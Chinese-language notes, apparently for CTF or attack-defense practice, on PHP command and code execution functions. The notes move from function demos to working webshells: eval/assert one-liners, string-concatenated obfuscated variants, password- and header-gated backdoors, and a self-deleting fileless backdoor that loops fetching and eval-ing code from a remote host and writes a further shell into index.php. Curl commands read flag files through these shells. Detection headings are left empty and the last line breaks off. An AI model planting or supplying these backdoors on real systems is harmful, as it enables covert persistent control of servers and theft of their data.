### 命令执行函数
常见：
```
system()
exec()
反撇号` eg: echo `dir`;//你要确保shell_exec函数可用，否则是无法使用这种反撇号执行系统外部命令的。
```
```
root@kali:/var/www/html# cat 2.php
<?php
system('id');
echo exec('id')."\n";
echo shell_exec("id");
echo `id`;
?>

root@kali:/var/www/html# php 2.php
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
```
root@kali:/tmp# cat /var/www/html/9.php
<?php
echo `$_POST[1]`;
?>
root@kali:/tmp# curl 127.0.0.1/9.php --data "1=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
root@kali:/tmp# 
```


无回显的`popen()`
```
root@kali:/var/www/html# cat 123.php
<?php
$fp = popen("/bin/cat /flag.txt >123.txt","r");
?>
root@kali:/var/www/html# php 123.php
root@kali:/var/www/html# cat 123.txt
16dee3a64a607c423fdfd866be7c3762
```
无回显的`passthru`
```
root@kali:/var/www/html# cat passthru.php
<?php passthru("cat /flag.txt >3444.txt");?>
root@kali:/var/www/html# php passthru.php
root@kali:/var/www/html# cat 3444.txt 
16dee3a64a607c423fdfd866be7c3762
```

#### 代码执行

eval函数中参数是字符，如：
```
eval('echo 1;');
```
assert函数中参数为表达式 （或者为函数），如：
```
assert(phpinfo()) 
```
这样：`assert(eval('echo 1;'));`，无法执行。

如：
```
<?php assert($_GET[1]);?>

http://172.16.2.234:8011/3.php?1=system(%22cat%20/flag.txt%22)
http://172.16.2.234:8011/3.php?1=print_r(file_get_contents(%22/flag.txt%22))
```

```
<?php assert($_REQUEST[1]);?>

curl "http://172.16.2.234:8011/4.php" -d "1=system('cat /flag*')"
de9d4919ce86aeb38a5332c7d1c4d24a
```

```
php -r "assert(system('ls -al'));"
```

-----------------
#### PHP代码执行函数总结

PHP中可以执行代码的函数，常用于编写一句话木马，可能导致代码执行漏洞，这里对代码执行函数做一些归纳。

常见代码执行函数，如  
```
eval()、assert()、preg_replace()、create_function()
array_map()、call_user_func()、call_user_func_array()，array_filter，usort，uasort()
文件操作函数、动态函数（$a($b)）
```
1、eval() 

eval() 函数把字符串按照 PHP 代码来计算，如常见的一句话后门程序：<?php eval($_POST[cmd])?>

2、assert()

与eval类似，字符串被 assert() 当做 PHP 代码来执行，如：

示例代码：
```
<?php 
//?cmd=phpinfo()
assert($_REQUEST[cmd]); 
?>
```
3、preg_replace()
```

mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )

//搜索subject中匹配pattern的部分， 以replacement进行替换。
```
preg_replace()函数原本是执行一个正则表达式的搜索和替换，但因为存在危险的/e修饰符，使 preg_replace() 将 replacement 参数当作 PHP 代码

示例代码：
```
<?php 
//?cmd=phpinfo()
@preg_replace("/abc/e",$_REQUEST['cmd'],"abcd");
?>
```
4、create_function()

create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create_function()执行任意命令。

代码示例：
```
<?php 
//?cmd=phpinfo();
$func =create_function('',$_REQUEST['cmd']);
$func();
?>
```
参考链接：

代码安全：PHP create_function()注入命令执行漏洞

http://www.cnseay.com/1901/

http://lovexm.blog.51cto.com/3567383/1743442

http://qqhack8.blog.163.com/blog/static/11414798520153795157139/

5、array_map()

array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。

代码示例：

```
<?php
//?func=system&cmd=whoami
$func=$_GET['func'];
$cmd=$_GET['cmd'];
$array[0]=$cmd;
$new_array=array_map($func,$array);
//print_r($new_array);
?>
```
6、call_user_func()/call_user_func_array ()

call_user_func — 把第一个参数作为回调函数调用,其余参数是回调函数的参数。

call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数

```
<?php 
//?cmd=phpinfo()
@call_user_func(assert,$_GET['cmd']);
?>

<?php 
//?cmd=phpinfo()
$cmd=$_GET['cmd'];
$array[0]=$cmd;
call_user_func_array("assert",$array);
?>
```
 7、array_filter()
```
　　array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )
```
依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。

```
<?php 
//?func=system&cmd=whoami
$cmd=$_GET['cmd'];
$array1=array($cmd);
$func =$_GET['func'];
array_filter($array1,$func);
?>
```
8、usort()、uasort()

usort() 通过用户自定义的比较函数对数组进行排序。

uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。

代码示例：

```
php环境>=5.6才能用
<?php usort(...$_GET);?>
利用方式：
test.php?1[]=1-1&1[]=eval($_POST['x'])&2=assert
[POST]:x=phpinfo();

php环境>=<5.6才能用
<?php usort($_GET,'asse'.'rt');?>
利用方式：
test.php?1=1+1&2=eval($_POST[x])
[POST]:x=phpinfo();
```
源自：https://www.wd0g.com/?p=190

https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html

9、文件操作函数

file_put_contents() 函数把一个字符串写入文件中。
fputs() 函数写入文件
```
<?php 
$test='<?php eval($_POST[cmd]);?>';
file_put_contents('test1.php',$test);
?>
<?php 
fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>'); 
?>
```

 

 10、动态函数

PHP函数直接由字符串拼接

代码示例：
```
<?php 
//?a=assert&b=phpinfo()
$_GET['a']($_GET['b']);
?>
```
----------------------

#### 稍微变异的一句话木马：
```
<?php $a="a"."s"."se"."rt";$a($_COOKIE[1]);?>
```
使用了变量函数 $a，变量储存了函数名，便可以直接用变量替代函数名。
```
curl "http://172.16.2.234:8011/5.php" --cookie "1=system('cat /flag*')"
d869ad3131f3b77b5151ea5f75e21f97
```

### PHP无文件后门：

php常驻内存的问题，想要将远程文件写入本地，并且让文件常驻内存中。
代码构想：
```
unlink($_SERVER['SCRIPT_FILENAME']); // 删除自身
ignore_user_abort(true); // 驻留进程，等待指令
set_time_limit(0); // 不关闭程序，保持连接
```

webshell.php
```
<?php
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);

$remote_file = 'http://182.168.2.2/file.txt';
while($code = file_get_contents($remote_file)){
  @eval($code);
  sleep(10);  //几秒写一次
};
?>
```

**`http://182.168.2.2/file.txt`**

```
file_put_contents('index.php','<?php $a="a"."s"."se"."rt";$a(\$_POST[1]);?>',FILE_APPEND);
//FILE_APPEND追加写入, 单引号括起来，$无需转义
```

**`curl "http://172.16.2.234:8011/index.php" --cookie "1=system('echo 66668888 & cat /flag*')"`**

```
root@kali:/tmp# curl "http://172.16.2.234:8011" -s --cookie "1=system('echo 66668888 & cat /flag*')"|grep 66668888
a17ef5f51631bba2b7098bdeee4d729566668888
a17ef5f51631bba2b7098bdeee4d729566668888
a17ef5f51631bba2b7098bdeee4d729566668888
...
```


#### 最近改动的文件

#### 日志分析


#### 写权限  执行权限


#### grep 带有特俗字符的文件   sed -i替换


md5马:
```
//v5est0r
<?php $a="a"."s"."se"."rt";if (md5($_POST[2])==="10972d718c21fdc8718efbaa8e67740e"){$a($_POST[123]);}?>

POST: 2=v5est0r&123=system("ls -al")
```
header传参的马:
```
<?php $a="a"."s"."se"."rt";if (md5($_SERVER['HTTP_X'])==="10972d718c21fdc8718efbaa8e67740e"){$a($_SERVER['HTTP_Y']);}?>
```

curl -



